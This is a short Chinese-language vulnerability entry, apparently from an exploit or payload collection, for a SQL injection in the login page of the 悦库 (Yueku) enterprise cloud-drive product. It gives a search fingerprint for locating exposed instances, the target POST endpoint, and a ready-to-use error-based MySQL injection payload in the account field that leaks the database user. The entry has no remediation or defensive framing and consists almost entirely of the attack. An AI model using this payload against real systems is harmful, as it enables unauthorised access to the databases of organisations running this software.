# 悦库企业网盘userlogin.htmlSQL注入漏洞

悦库企业网盘userlogin.html ｜ SQL注入 ｜ —
- **指纹**：`app="悦库-悦库网盘"`
- **请求**：`POST /user/login/.html HTTP/1.1`

**Payload**
```
account=') AND GTID_SUBSET(CONCAT(0x7e,(SELECT (ELT(5597=5597,user()))),0x7e),5597)-- HZLK
```